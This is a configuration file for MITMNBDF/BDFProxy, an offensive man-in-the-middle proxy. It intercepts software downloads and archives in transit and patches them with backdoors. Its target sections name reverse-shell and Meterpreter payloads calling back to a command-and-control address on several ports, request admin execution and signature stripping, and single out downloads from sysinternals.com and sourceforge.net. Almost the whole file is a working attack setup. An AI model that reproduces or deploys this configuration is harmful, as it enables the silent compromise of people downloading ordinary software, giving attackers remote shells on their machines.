#    MITMNBDF v1.0
#    Author Davide Barbato
#    Copyright (c) 2015, Davide Barbato
#    All rights reserved.
#    Redistribution and use in source and binary forms, with or without modification,
#    are permitted provided that the following conditions are met:
#        1. Redistributions of source code must retain the above copyright notice,
#        this list of conditions and the following disclaimer.
#        2. Redistributions in binary form must reproduce the above copyright notice,
#        this list of conditions and the following disclaimer in the documentation
#        and/or other materials provided with the distribution.
#        3. Neither the name of the copyright holder nor the names of its contributors
#        may be used to endorse or promote products derived from this software without
#        specific prior written permission.
#    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
#    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
#    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
#    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
#    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
#    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
#    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
#    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
#    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
#    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
#    POSSIBILITY OF SUCH DAMAGE.
#    Tested on Ubuntu 14.04
#
#    BackdoorFactory Proxy (BDFProxy) v0.3 - 'W00t'
#    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
#    Copyright (c) 2013-2015, Joshua Pitts
#    All rights reserved.
#    Redistribution and use in source and binary forms, with or without modification,
#    are permitted provided that the following conditions are met:
#        1. Redistributions of source code must retain the above copyright notice,
#        this list of conditions and the following disclaimer.
#        2. Redistributions in binary form must reproduce the above copyright notice,
#        this list of conditions and the following disclaimer in the documentation
#        and/or other materials provided with the distribution.
#        3. Neither the name of the copyright holder nor the names of its contributors
#        may be used to endorse or promote products derived from this software without
#        specific prior written permission.
#    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
#    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
#    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
#    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
#    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
#    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
#    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
#    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
#    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
#    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
#    POSSIBILITY OF SUCH DAMAGE.
#    Tested on Kali-Linux.


[Overall]
proxyMode = transparent  # Modes: None, socks5, transparent, reverse, upstream
MaxSizeFileRequested = 100000000 # will send a 502 request of large content to the client (server error)
certLocation = ~/.mitmproxy/mitmproxy-ca.pem
proxyPort = 8080
sslports = 443, 8443
loglevel = DEBUG
logname = proxy.log
resourceScriptFile = mitmnbdf_msf.rc
supportedArchiveTypes = ZIP, TAR, AR, DEB, LZMA
supportedBinaryTypes = "application/octet-stream", "application/x-msdownload", "application/x-msdos-program", "binary/octet-stream", "application/x-executable", "application/x-dosexec"


[hosts]
#whitelist host/IP - patch these only. 
#ALL is everything, use the blacklist to leave certain hosts/IPs out

whitelist = ALL

#Hosts that are never patched, but still pass through the proxy. You can include host and ip, recommended to do both.

blacklist = ,   # a comma is null do not leave blank


[keywords]
#These checks look at the path of a url for keywords

whitelist = ALL

#For blacklist note binaries that you do not want to touch at all

# Also applied in zip files

blacklist = Tcpview.exe, skype.exe, .dll

[ZIP]
# patchCount is the max number of files to patch in a zip file
# After the max is reached it will bypass the rest of the files 
# and send on it's way

patchCount = 5

# In Bytes
maxSize = 40000000

blacklist = .dll,  #don't do dlls in a zip file

mimes = "application/x-zip-compressed", "application/zip"

	[["application/x-zip-compressed"]]
	format = zip
	filter = None

	[["application/zip"]]
	format = zip
	filter = None

[AR]
# patchCount is the max number of files to patch in an ar file
# After the max is reached it will bypass the rest of the files
# and send on it's way

patchCount = 5

# In Bytes
maxSize = 40000000

blacklist = ,

mimes = "application/x-archive"

	[["application/x-archive"]]
	format = ar_bsd
	filter = None

[DEB]
# patchCount is the max number of files to patch in an ar file
# After the max is reached it will bypass the rest of the files
# and send on it's way

patchCount = 5

# In Bytes
maxSize = 40000000

blacklist = ,

mimes = "application/x-debian-package"

[LZMA]
# patchCount is the max number of files to patch in an lzma file
# After the max is reached it will bypass the rest of the files
# and send on it's way

patchCount = 5

# In Bytes
maxSize = 40000000

blacklist = .dll,  #don't do dlls in a ar file

mimes = "application/x-xz"

	[["application/x-xz"]]
	format = gnutar
	filter = xz

[TAR]
# patchCount is the max number of files to patch in a tar file
# After the max is reached it will bypass the rest of the files
# and send on it's way

patchCount = 5

# In Bytes
maxSize = 60000000

blacklist = ,   # a comma is null do not leave blank

mimes = "application/x-tar", "application/gzip", "application/x-gzip", "application/gnutar", "application/x-bzip2", "application/x-bzip"

	[["application/gnutar"]]
	format = ustar
	filter = gzip

	[["application/x-gzip"]]
	format = ustar
	filter = gzip

	[["application/gzip"]]
	format = ustar
	filter = gzip

	[["application/x-tar"]]
	format = ustar
	filter = None

	[["application/x-bzip"]]
	format = gnutar
	filter = bzip2

	[["application/x-bzip2"]]
	format = gnutar
	filter = bzip2

[targets]
	# MAKE SURE that your settings for host and port DO NOT
	# overlap between different types of payloads
	
	[[ALL]] # DEFAULT settings for all targets REQUIRED
	
	LinuxType = ALL 	# choices: x86/x64/ALL/None
	WindowsType = ALL 	# choices: x86/x64/ALL/None
	FatPriority = x64   # choices: x86 or x64
	
	FileSizeMax = 10000000  # ~10 MB (just under) No patching of files this large

	CompressedFiles = True #True/False
		[[[LinuxIntelx86]]]
		SHELL = reverse_shell_tcp   # This is the BDF syntax
		HOST = 192.168.8.129 		# The C2
		PORT = 8888
		SUPPLIED_SHELLCODE = None
		MSFPAYLOAD = linux/x86/shell_reverse_tcp	# MSF syntax
		
		[[[LinuxIntelx64]]]
		SHELL = reverse_shell_tcp
		HOST = 192.168.8.129
		PORT = 9999
		SUPPLIED_SHELLCODE = None
		MSFPAYLOAD = linux/x64/shell_reverse_tcp

		[[[WindowsIntelx86]]]
		PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
		# PATCH_METHOD overwrites PATCH_TYPE, use automatic or onionduke
		PATCH_METHOD = automatic
		HOST = 192.168.8.129
		PORT = 8443
		SHELL = iat_reverse_tcp_stager_threaded
		SUPPLIED_SHELLCODE = None
		ZERO_CERT = True
		PATCH_DLL = False
		RUNAS_ADMIN = True
		XP_MODE = True
		# SUPPLIED_BINARY is for use with PATCH_METHOD 'onionduke' DLL/EXE can be x64 and
		#  with PATCH_METHOD 'replace' use an EXE not DLL
		SUPPLIED_BINARY = veil_go_payload.exe
		MSFPAYLOAD = windows/meterpreter/reverse_tcp

		[[[WindowsIntelx64]]]
		PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
		# PATCH_METHOD overwrites PATCH_TYPE, use automatic or onionduke
		PATCH_METHOD = automatic
		HOST = 192.168.8.129
		PORT = 8088
		SHELL = iat_reverse_tcp_stager_threaded
		SUPPLIED_SHELLCODE = None
		ZERO_CERT = True
		PATCH_DLL = False
		RUNAS_ADMIN = True
		XP_MODE = False
		# SUPPLIED_BINARY is for use with PATCH_METHOD 'onionduke' DLL/EXE can be x64 and
		#  with PATCH_METHOD 'replace' use an EXE not DLL
		SUPPLIED_BINARY = veil_go_payload.exe
		MSFPAYLOAD = windows/x64/shell/reverse_tcp

		[[[MachoIntelx86]]]
		SHELL = reverse_shell_tcp
		HOST = 192.168.8.129
		PORT = 4444
		SUPPLIED_SHELLCODE = None
		MSFPAYLOAD = linux/x86/shell_reverse_tcp

		[[[MachoIntelx64]]]
		SHELL = reverse_shell_tcp
		HOST = 192.168.8.129
		PORT = 5555
		SUPPLIED_SHELLCODE = None
		MSFPAYLOAD = linux/x64/shell_reverse_tcp

	# Call out the difference for targets here as they differ from ALL
	# These settings override the ALL settings
	
	[[sysinternals.com]]
	LinuxType = None
	WindowsType = x86
	CompressedFiles = False
	#inherits WindowsIntelx32 from ALL
		[[[WindowsIntelx86]]]
		PATCH_DLL = False
		ZERO_CERT = True

	[[sourceforge.net]]
	WindowsType = x64
	CompressedFiles = False

		[[[WindowsIntelx64]]]
		PATCH_DLL = False

		[[[WindowsIntelx86]]]
		PATCH_DLL = False

		[[[MachoIntelx64]]]
		HOST = 777.777.777.777
